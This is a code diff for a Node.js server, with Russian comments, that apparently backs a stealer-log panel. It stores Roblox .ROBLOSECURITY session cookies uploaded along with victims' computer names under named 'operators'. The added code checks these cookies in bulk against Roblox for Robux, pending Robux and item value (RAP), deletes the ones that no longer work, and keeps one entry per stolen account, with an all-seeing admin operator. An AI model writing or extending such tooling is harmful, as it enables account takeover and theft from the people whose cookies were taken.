@@ -792,8 +792,23 @@ async function fetchRobuxInfo(robloSecurity) {
 
 // Удаление невалидного токена из записи (очищает roblox.security, оставляя данные ПК)
 async function removeInvalidToken(db, user, filename) {
-  // Безопасная защита: не стирать токены автоматически при сетевых ошибках
-  return;
+  try {
+    if (db) {
+      await db.collection('files').updateOne(
+        { name: filename },
+        { $set: { 'roblox.security': '' }, $unset: { 'robuxInfo': '' } }
+      );
+    } else {
+      const doc = (global.memFiles || []).find(f => f.name === filename);
+      if (doc && doc.roblox) {
+        doc.roblox.security = '';
+        delete doc.robuxInfo;
+      }
+    }
+    console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён из БД: ${filename}`);
+  } catch (e) {
+    console.error('removeInvalidToken error:', e.message);
+  }
 }
 
 // Асинхронное обновление robuxInfo (не блокирует ответ /upload)
@@ -801,17 +816,14 @@ async function fetchRobuxInfoAsync(robloSecurity, operator, uploaded, db) {
   try {
     const rbInfo = await fetchRobuxInfo(robloSecurity);
     if (rbInfo.valid && rbInfo.userId) {
-      await db.collection('files').deleteMany({
-        operator: operator,
-        name: { $nin: uploaded.map(u => u.name) },
-        'robuxInfo.userId': rbInfo.userId
-      });
       for (const u of uploaded) {
         await db.collection('files').updateOne(
           { name: u.name, operator: operator },
           { $set: {
             'robuxInfo.userId': rbInfo.userId,
             'robuxInfo.robux': rbInfo.robux,
+            'robuxInfo.pendingRobux': rbInfo.pendingRobux || 0,
+            'robuxInfo.rap': rbInfo.rap || 0,
             'robuxInfo.valid': true,
             'robuxInfo.checked': new Date().toISOString(),
             'roblox.userId': rbInfo.userId,
@@ -834,19 +846,27 @@ app.post('/robux-check', requireAuth, async (req, res) => {
   res.json(info);
 });
 
-// POST /robux-bulk — быстрая параллельная проверка всех сохранённых токенов (бачинг по 10)
+// POST /robux-bulk — быстрая параллельная проверка всех сохранённых токенов (бачинг по 10) с удалением невалида
 app.post('/robux-bulk', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
   const db = await getDb();
   let docs;
+  const opQuery = (user.toLowerCase() === 'shonll')
+    ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
+    : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+
   if (db) {
-    docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
+    docs = await db.collection('files').find({ ...opQuery, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
   } else {
-    docs = (global.memFiles || []).filter(f => f.operator === user && f.roblox && f.roblox.security);
+    docs = (global.memFiles || []).filter(f => {
+      const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
+      return isOp && f.roblox && f.roblox.security;
+    });
   }
 
   const BATCH_SIZE = 10;
-  const results = [];
+  const validResults = [];
+  let deletedCount = 0;
 
   for (let i = 0; i < docs.length; i += BATCH_SIZE) {
     const chunk = docs.slice(i, i + BATCH_SIZE);
@@ -856,17 +876,57 @@ app.post('/robux-bulk', requireAuth, async (req, res) => {
         const info = await fetchRobuxInfo(roblox.security);
         if (!info.valid) {
           await removeInvalidToken(db, user, doc.name);
-          console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён: ${doc.name}`);
+          deletedCount++;
+          return null;
         }
-        return { file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, security: roblox.security, uploadedAt: doc.uploadedAt, lastLogin: roblox.lastLogin, ...info };
+        if (db && info.userId) {
+          await db.collection('files').updateOne(
+            { _id: doc._id },
+            { $set: {
+              'robuxInfo.userId': info.userId,
+              'robuxInfo.robux': info.robux,
+              'robuxInfo.pendingRobux': info.pendingRobux || 0,
+              'robuxInfo.rap': info.rap || 0,
+              'robuxInfo.valid': true,
+              'robuxInfo.checked': new Date().toISOString(),
+              'roblox.userId': info.userId,
+              ...(info.username ? { 'roblox.user': info.username } : {})
+            }}
+          );
+        }
+        return {
+          file: doc.name,
+          originalName: doc.originalName || doc.name,
+          computer: doc.computer?.name || 'Unknown',
+          user: info.username || roblox.user || 'Roblox User',
+          username: info.username || roblox.user || 'Roblox User',
+          userId: info.userId || roblox.userId,
+          security: roblox.security,
+          uploadedAt: doc.uploadedAt,
+          lastLogin: roblox.lastLogin,
+          ...info
+        };
       } catch (e) {
         await removeInvalidToken(db, user, doc.name);
-        return { file: doc.name, user: roblox.user, valid: false, error: e.message };
+        deletedCount++;
+        return null;
       }
     }));
-    results.push(...chunkResults);
+    validResults.push(...chunkResults.filter(Boolean));
   }
-  res.json(results);
+
+  const byUser = new Map();
+  for (const r of validResults) {
+    const id = r.userId || r.username || r.security;
+    if (!id) continue;
+    const existing = byUser.get(id);
+    if (!existing || new Date(r.uploadedAt || 0) > new Date(existing.uploadedAt || 0)) {
+      byUser.set(id, r);
+    }
+  }
+
+  const sorted = [...byUser.values()].sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
+  res.json({ tokens: sorted, deletedCount });
 });
 
 // GET /api/roblox-profile-proxy?username=xxx — прокси для поиска профилей и аватарок Roblox
